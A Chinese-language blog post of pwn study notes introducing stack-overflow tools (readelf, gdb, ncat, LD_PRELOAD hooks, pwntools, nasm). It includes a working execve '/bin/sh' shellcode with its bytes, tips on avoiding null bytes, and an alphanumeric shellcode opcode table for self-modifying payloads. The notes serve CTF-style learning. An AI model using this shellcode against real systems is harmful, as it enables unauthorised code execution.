---

title: NTU STCS 2016学习笔记 0x01 Intro
date: 2020-08-23 16:49:01
description: 栈溢出(StackOverflow)入门工具介绍
cover: cover.jpg 
tags:
- pwn
categories:
- NTU STCS 2016学习笔记
---


<!-- more -->

## objdump

常用指令

```bash
$ objdump -T binary
$ cat /proc/`pidof binary`/maps
```

## readelf

分析elf binary header里的一些信息
readelf -a | grep STACK 看能否跑shellcode

```bash
$ readelf -a ./binary | grep STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
```

**trick**

```bash
$ readelf -a ./binary | grep ' system@'
$ ldd binary
```

**trick:execstack**

```bash
$ execstack --h
Usage: execstack [OPTION...]
execstack -- program to query or set executable stack flag

  -c, --clear-execstack      Clear executable stack flag bit
  -q, --query                Query executable stack flag bit
  -s, --set-execstack        Set executable stack flag bit
  -?, --help                 Give this help list
      --usage                Give a short usage message
  -V, --version              Print program version
Report bugs to <jakub@redhat.com>.
```

* * *

## ncat

建立local service环境，因为你不会再无法debug的情况下直接对remote做事
ncat -vc ./binary -kl 127.0.0.1 8888
ncat -vc 'strace -e trace=read ./binary' -kl ::1 4000

* * *

## GNU GDB

layout asm
attach [pid]

```bash
$ echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

b,c,si,ni,fin
x/3wx,x/7i,x/bx,x/s,p

* * *

## 技巧 Hook&Patch

当binary文件有alarm时关掉alarm

```bash
$ sed -i s/alarm/isnan/g ./binary
$ vim ./binary
:%s/alarm/isnan/g #使用isnan函数替换alarm
$ ltrace ./binary
__libc_start_main(0x8048480, 1, 0xfffa3ba4, 0x80484c0 <unfinished ...>
isnan(60, 0xffa2ed14, 0xffa2ed1c, 0xf75b2c8b)                   = 0
```

hook alarm by LD_PRELOAD

```c
// hook.c
#include <stdio.h>
unsigned int alarm(unsigned int seconds){
  printf("%d\n", seconds);
}
```

```bash
$ gcc hook.c -o hook.so -shared -fPIC -m32
$ LD_PRELOAD=./hook.so ./binary
```

LD_SHOW_AUXV

```bash
$ ncat -vc 'LD_SHOW_AUXV=1 ./level2' -kl 127.0.0.1 6666
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on 127.0.0.1:6666
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:36108

$ nc 127.0.0.1 6666
AT_SYSINFO:           0xf7f7ab40
AT_SYSINFO_EHDR:      0xf7f7a000
...
AT_PAGESZ:            4096
AT_CLKTCK:            100
AT_PHDR:              0x8048034
AT_PHENT:             32
AT_PHNUM:             9
AT_BASE:              0xf7f7b000 #librarybase
AT_FLAGS:             0x0
AT_ENTRY:             0x8048350
...
AT_SECURE:            0
AT_RANDOM:            0xffd88bcb #stackout canary
AT_HWCAP2:            0x0
...
AT_EXECFN:            /bin/sh
AT_PLATFORM:          x86_64
Input:

```

* * *

## [qira](https://qira.me)

非常好用的gdb动态调试工具，部署略

> Ubuntu 14.04 and 16.04 supported out of the box.
> 18.04 is having a problem with building QEMU
> See forked QEMU source at <https://github.com/geohot/qemu/tree/qira> to fix.

[使用方法](https://github.com/geohot/qira)

开启指令 python qira.py -s ./binary

* * *

## pwntools

```bash
pip install pwntools
```

[Documentation](http://docs.pwntools.com/en/stable/)

## nasm

X86编译工具，编译shellcode使用

```bash
nasm -felf32 test.asm -o test.o
ld -melf_i386 test.o -o test
objcopy -O binary test.o test.bin
objdump -b binary -m i386 -D test.bin
```

e.g

```x86asm
[section .data]
global _start
_start:
	jmp sh
se:
	pop ebx
	xor eax, eax
	mov al, 11
	xor ecx, ecx
	xor edx, edx
	int 0x80
sh:
	call se
	db '/bin/sh', 0
```

**注：使用mov eax, 0赋值时可能会出错**

错误代码：

```x86asm
se:
  pop ebx
  mov eax, 11
  mov ecx, ecx
  mov edx, edx
  int 0x80
```

用作payload时会产生0x00字符遇到read()的情况会被截断

```bash
$ xxd test.bin
00000000: eb0c 5bb8 0b00 0000 89c9 89d2 cd80 e8ef  ..[.............
00000010: ffff ff2f 6269 6e2f 7368 00              .../bin/sh.
```

**[Linux System Call Table](http://shell-storm.org/shellcode/files/syscalls.html)**

* * *

## shellcode

-   不能有\\0
-   可以用call + pop的方式拿到shellcode address
-   长度不足时，如果还能输入可以make read函数

## alphanumeric Shellcode

> 只能用0-9写shellcode

int 0x80 = \\xcd\\x80，如何用数字做sys_call？

**自修改**

| decoder1 | encoded decoder2 | encoded shellcode |

    a   61                      popa   
    b   62 41 42                bound  eax, QWORD PTR [ecx+0x42]
    c   63 41 42                arpl   WORD PTR [ecx+0x42], ax
    d   64 41                   fs inc ecx
    e   65 41                   gs inc ecx
    f   66 41                   inc    cx
    g   67 41                   addr16 inc ecx
    h   68 41 42 43 44          push   0x44434241
    i   69 41 42 43 44 45 46    imul   eax, DWORD PTR [ecx+0x42], 0x46454443
    j   6a 41                   push   0x41
    k   6b 41 42 43             imul   eax, DWORD PTR [ecx+0x42], 0x43
    l   6c                      ins    BYTE PTR es:[edi], dx
    m   6d                      ins    DWORD PTR es:[edi], dx
    n   6e                      outs   dx, BYTE PTR ds:[esi]
    o   6f                      outs   dx, DWORD PTR ds:[esi]
    p   70 41                   jo     0x43
    q   71 41                   jno    0x43
    r   72 41                   jb     0x43
    s   73 41                   jae    0x43
    t   74 41                   je     0x43
    u   75 41                   jne    0x43
    v   76 41                   jbe    0x43
    w   77 41                   ja     0x43
    x   78 41                   js     0x43
    y   79 41                   jns    0x43
    z   7a 41                   jp     0x43
    A   41                      inc    ecx
    B   42                      inc    edx
    C   43                      inc    ebx
    D   44                      inc    esp
    E   45                      inc    ebp
    F   46                      inc    esi
    G   47                      inc    edi
    H   48                      dec    eax
    I   49                      dec    ecx
    J   4a                      dec    edx
    K   4b                      dec    ebx
    L   4c                      dec    esp
    M   4d                      dec    ebp
    N   4e                      dec    esi
    O   4f                      dec    edi
    P   50                      push   eax
    Q   51                      push   ecx
    R   52                      push   edx
    S   53                      push   ebx
    T   54                      push   esp
    U   55                      push   ebp
    V   56                      push   esi
    W   57                      push   edi
    X   58                      pop    eax
    Y   59                      pop    ecx
    Z   5a                      pop    edx
    0   30 41 42                xor    BYTE PTR [ecx+0x42], al
    1   31 41 42                xor    DWORD PTR [ecx+0x42], eax
    2   32 41 42                xor    al, BYTE PTR [ecx+0x42]
    3   33 41 42                xor    eax, DWORD PTR [ecx+0x42]
    4   34 41                   xor    al, 0x41
    5   35 41 42 43 44          xor    eax, 0x44434241
    6   36 41                   ss inc ecx
    7   37                      aaa    
    8   38 41 42                cmp    BYTE PTR [ecx+0x42], al
    9   39 41 42                cmp    DWORD PTR [ecx+0x42], eax


Register赋值

    PQRSTUVWa
    0:  50      push  eax
    1:  51      push  ecx
    2:  52      push  edx  
    3:  53      push  ebx
    4:  54      push  esp
    5:  55      push  ebp
    6:  56      push  esi
    7:  57      push  edi
    8:  61      popa

自修改shellcode

    jDX0A1
    0:  6a 44       push  0x44
    2:  58          pop   eax
    3:  30 41 31    xor   BYTE PTR [ecx+0x31],al

eax赋值

    jDX4C
    0:  6a 44       push  0x44
    2:  58          pop   eax
    3:  34 43       xor   al,0x43
